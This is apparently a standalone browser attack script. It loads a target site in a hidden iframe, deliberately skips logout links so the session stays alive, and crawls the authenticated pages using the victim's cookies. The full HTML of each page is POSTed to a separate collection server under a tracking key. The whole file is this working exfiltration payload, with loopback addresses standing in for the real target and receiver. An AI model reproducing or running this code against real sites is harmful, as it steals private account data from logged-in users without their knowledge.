async function sendmqif(frame, key) {
	const doc = frame.contentDocument;
	if (doc) {
		const de = doc.documentElement;
		if (de) {
			await sendit(key, doc.location.href, de.innerHTML);
		}
	}
}

async function sendlinks(frame, key, predicate) {
	let links = frame.contentDocument.getElementsByTagName("a");
	let hrefs = [];
	for (let i=0; i<links.length; i++) {
		hrefs.push(links[i].href);
	}
	console.log(hrefs);
	hrefs.filter(predicate).forEach((href) => {
		let get = fetch(href, {
			credentials: "include"
		})
		.then((r) => r.text())
		.then((contents) =>	sendit(key, href, contents));
	});
}

async function sendit(key, href, html) {
	console.log("sending href " + href);
	return fetch("http://127.0.2.1:8080/cd/mq", {
		method: "POST",
		headers: {
		    "Content-Type": "application/x-www-form-urlencoded",
		  },
		body: new URLSearchParams({
			key: key,
			page: href,
			contents: html,
		}),
	});
}

async function sendcustomrefs(key, hrefs) {
	hrefs.forEach((h) => {
		fetch(origin + h, {
			credentials: "include"
		})
		.then((r) => r.text())
		.then((contents) =>	sendit(key, origin + h, contents));
	})
}

async function sleep() {
	await new Promise((r) => setTimeout(r, 20000));
}

// https://stackoverflow.com/questions/25098021/securityerror-blocked-a-frame-with-origin-from-accessing-a-cross-origin-frame
// iframe src must match origin in all sane browsers
let origin = "https://127.0.3.2:8443/";
let frame = document.createElement("iframe");
frame.src = origin;
frame.setAttribute("style","display:none");
frame.addEventListener("load", function () {
	console.log("ready");
	setTimeout( function () {
		sendmqif(frame, "mq18");
		sendlinks(frame, "mq18", (h) => {
			// ignore other origins, possible logout pages and links back to the page root
			if (h.lastIndexOf(origin) == 0 && h.toLowerCase().lastIndexOf("logout") == -1 &&
					h.toLowerCase().lastIndexOf("logoff") == -1 &&
					h.length > origin.length ) {
				return true;
			}
			return false;
		});
		sendcustomrefs("mq18", [])
	}, 3000);
})

let body = document.getElementsByTagName("body")[0];
body.appendChild(frame);
